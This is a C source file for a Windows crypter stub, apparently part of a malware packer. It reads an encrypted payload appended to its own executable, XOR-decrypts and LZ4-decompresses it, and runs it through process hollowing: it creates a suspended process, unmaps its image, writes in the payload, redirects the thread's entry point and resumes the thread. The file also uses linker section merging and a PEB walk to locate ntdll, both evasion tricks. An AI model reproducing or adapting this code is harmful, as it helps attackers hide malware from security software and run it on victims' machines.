#include "crt.h"

#include "../common/common.h"

#include <TlHelp32.h>

#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")
#pragma comment(linker,"/FILEALIGN:128")

BOOL ExecuteFile(LPSTR szFilePath, LPVOID pFile, PHANDLE phThread)
{
	typedef LONG(WINAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
	typedef BOOL(WINAPI* NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);

	HMODULE hNtModule = NULL;
	
#ifdef A86
	__asm
	{
		mov ebx, fs: [0x30]		// Get PEB
		mov ebx, [ebx + 0xC]	// Get PEB->Ldr
		mov ebx, [ebx + 0x14]	// Get 1st Entry
		mov ebx, [ebx]			// Get NT DLL
		mov ebx, [ebx + 0x10]	// Get the entry's base address
		mov hNtModule, ebx
	}
#else
	hNtModule = GetModuleHandleA("ntdll");
#endif

	if (!hNtModule)
		return FALSE;

	PIMAGE_DOS_HEADER lpImageDosHeader = (PIMAGE_DOS_HEADER)pFile;

	if (lpImageDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS lpImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORDT)pFile + lpImageDosHeader->e_lfanew);

		if (lpImageNtHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			PROCESS_INFORMATION ProcessInfo = { 0 };
			STARTUPINFOA StartupInfo = { 0 };

			RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));
			RtlZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
			{
				PCONTEXT lpContext = VirtualAlloc(NULL, sizeof(lpContext), MEM_COMMIT, PAGE_READWRITE);

				lpContext->ContextFlags = CONTEXT_FULL;

				if (GetThreadContext(ProcessInfo.hThread, (LPCONTEXT)lpContext))
				{
#ifdef A86
					PDWORDT pdwRegBx = &lpContext->Ebx;
#else
					PDWORDT pdwRegBx = &lpContext->Rdx;
#endif
					PDWORDT pdwImageBase = NULL;

					ReadProcessMemory(ProcessInfo.hProcess, (LPCVOID)(*pdwRegBx + sizeof(LPVOID) * 2), (LPVOID)&pdwImageBase, sizeof(LPVOID), NULL);

					if ((DWORDT)pdwImageBase == lpImageNtHeaders->OptionalHeader.ImageBase)
					{
						NtUnmapViewOfSection xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(hNtModule, "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(ProcessInfo.hProcess, (PVOID)(pdwImageBase));
					}

					LPVOID lpImageBase = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)lpImageNtHeaders->OptionalHeader.ImageBase, lpImageNtHeaders->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

					if (lpImageBase)
					{
						PIMAGE_SECTION_HEADER lpImageSectionHeader;

						WriteProcessMemory(ProcessInfo.hProcess, lpImageBase, pFile, lpImageNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

						for (DWORDT dwCount = 0; dwCount < lpImageNtHeaders->FileHeader.NumberOfSections; dwCount++)
						{
							lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORDT)pFile + lpImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (dwCount * sizeof(IMAGE_SECTION_HEADER)));
							WriteProcessMemory(ProcessInfo.hProcess, (LPVOID)((DWORDT)lpImageBase + lpImageSectionHeader->VirtualAddress), (LPVOID)((DWORDT)pFile + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, NULL);
						}

						WriteProcessMemory(ProcessInfo.hProcess, (LPVOID)(*pdwRegBx + sizeof(LPVOID) * 2), (LPVOID)(&lpImageNtHeaders->OptionalHeader.ImageBase), sizeof(LPVOID), NULL);

#ifdef A86
						PDWORDT pdwRegAx = &lpContext->Eax;
#else
						PDWORDT pdwRegAx = &lpContext->Rcx;
#endif

						*pdwRegAx = (DWORD)(lpImageBase) + lpImageNtHeaders->OptionalHeader.AddressOfEntryPoint;

						NtSetThreadContext xNtSetThreadContext = (NtSetThreadContext)(GetProcAddress(hNtModule, "NtSetContextThread"));
						xNtSetThreadContext(ProcessInfo.hThread, (LPCONTEXT)(lpContext));

						*phThread = ProcessInfo.hThread;
					}
				}

				return ResumeThread(ProcessInfo.hThread) != (DWORD)-1;
			}
		}
	}

	return FALSE;
}


INT WINAPI WinMain()
{
	const char szEncryptionKey[] = STUB_DEFAULT_KEY;
	const char szSeparator[] = STUB_DEFAULT_SEPARATOR;

	char* szCurrentFilepath = MALLOC(MAX_PATH * sizeof(char));
	GetModuleFileNameA(NULL, szCurrentFilepath, MAX_PATH);

	HANDLE hStubFile = CreateFileA(szCurrentFilepath, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hStubFile == INVALID_HANDLE_VALUE)
		ExitProcess(0);

	LARGE_INTEGER size;
	if (!GetFileSizeEx(hStubFile, &size))
		ExitProcess(0);

	DWORD dwStubSize = size.QuadPart;
	PUCHAR puStubData = MALLOC(dwStubSize * sizeof(UCHAR));
	if (!puStubData)
		ExitProcess(0);

	DWORD iStubBytesReaded = 0;
	if (!ReadFile(hStubFile, puStubData, dwStubSize, &iStubBytesReaded, NULL) || iStubBytesReaded != dwStubSize)
		MFREE(puStubData),
		ExitProcess(0);
	
	CloseHandle(hStubFile);

	DWORD dwSeparatorPositionEnd = FindSig(puStubData, dwStubSize, szSeparator, strlen(szSeparator), 1) + strlen(szSeparator);
	DWORD dwExecutableSize = dwStubSize - dwSeparatorPositionEnd;

	PUCHAR puExecutableData = MALLOC(dwExecutableSize * sizeof(char));
	for (int i = dwSeparatorPositionEnd; i < dwStubSize; i++)
		*(puExecutableData + (i - dwSeparatorPositionEnd)) = *(puStubData + i);

	MFREE(puStubData);
	
	XORBinary(puExecutableData, dwExecutableSize, szEncryptionKey, strlen(szEncryptionKey));

#if CRYPTER_USE_LZ4_COMPRESSION
	int iMaxDecompressedSize = BinRead32(puExecutableData);

	PCHAR pDecompressedData = MALLOC(iMaxDecompressedSize * sizeof(CHAR));
	const char* pCompressedData = (const char*)puExecutableData + sizeof(int);

	int iDecompressedSize = LZ4_decompress_safe(pCompressedData, (char*)pDecompressedData, (int)dwExecutableSize - sizeof(int), iMaxDecompressedSize);

	if (iDecompressedSize != iMaxDecompressedSize)
		ExitProcess(0);

	MFREE(puExecutableData);

	puExecutableData = (PUCHAR)pDecompressedData;
#endif
	
	HANDLE hThread = INVALID_HANDLE_VALUE;

	if (!ExecuteFile(szCurrentFilepath, puExecutableData, &hThread))
		ExitProcess(0);

	MFREE(szCurrentFilepath);
	MFREE(puExecutableData);

	ExitProcess(0);
}